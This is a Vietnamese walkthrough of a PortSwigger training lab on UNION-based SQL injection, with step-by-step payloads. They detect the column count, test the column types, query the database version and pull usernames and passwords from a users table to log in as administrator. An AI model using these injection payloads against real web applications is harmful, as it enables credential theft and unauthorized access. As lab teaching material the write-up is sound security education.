![[Pasted image 20220617143839.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617143839.png)

------------------------

<h1>MÔ TẢ</h1>

Lab này chứa lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm. Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, vì vậy bạn có thể sử dụng UNION để tấn công truy xuất dữ liệu từ các bảng khác. 

Cơ sở dữ liệu chứa một bảng khác được gọi là ``user``, với các cột được gọi là ``username`` và ``password``.

Để giải quyết lab, cần thực hiện một cuộc tấn công SQL injection UNION để truy xuất tất cả usernames và passwords, đồng thời sử dụng thông tin để đăng nhập với tư cách ``administrartor``.

<h1>HƯỚNG DẪN</h1>

Bước 1: Xác định số cột
Bước 2: Xác định kiểu dữ liệu của từng cột
Bước 3: Thực hiện tấn công

<h1>GIẢI QUYẾT</h1>

**(1) Xác định số cột:**

> ' order by 1-- -> dữ liệu có sự thay đổi thứ tự nhưng không hiển thị cột được sắp xếp -> ẩn
> ' order by 2-- -> dữ liệu có sự thay đổi thứ tự và được hiển thị 
> ' order by 3-- -> 500

-> Số cột là 2

**(2) Xác định kiểu dữ liệu của từng cột**

> ' UNION SELECT 'a', NULL--

![[Pasted image 20220617145237.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617145237.png)

> ' UNION SELECT NULL, 'a'-- 

![[Pasted image 20220617145621.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617145621.png)

**(3) Thực hiện tấn công**

> ' UNION select NULL, username from users--

![[Pasted image 20220617145824.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617145824.png)

![[Pasted image 20220617145846.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617145846.png)

> ' UNION select NULL, password from users--

![[Pasted image 20220617150235.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617150235.png)

Chúng ta có thể dừng lại việc truy vấn ở đây và thực hiện thử username và password để đăng nhập vào account administrator.

Hoặc có thể sử dụng truy vấn để hiển thị data của hai cột. Để thực hiện được, cần xác định Hệ quản trị cơ sở dữ liệu đang sử dụng để đưa ra được syntax chính xác:

Xác định version: ' UNION select NULL, version()-- (Thử các payload xác định version, tham khảo SQL Injection Cheat sheet: [SQL injection cheat sheet | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/sql-injection/cheat-sheet))

![[Pasted image 20220617150629.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617150629.png)

> ' UNION select NULL, username || '*' || password from users--

![[Pasted image 20220617151025.png]]

Đăng nhập thành công!

![[Pasted image 20220617151220.png]]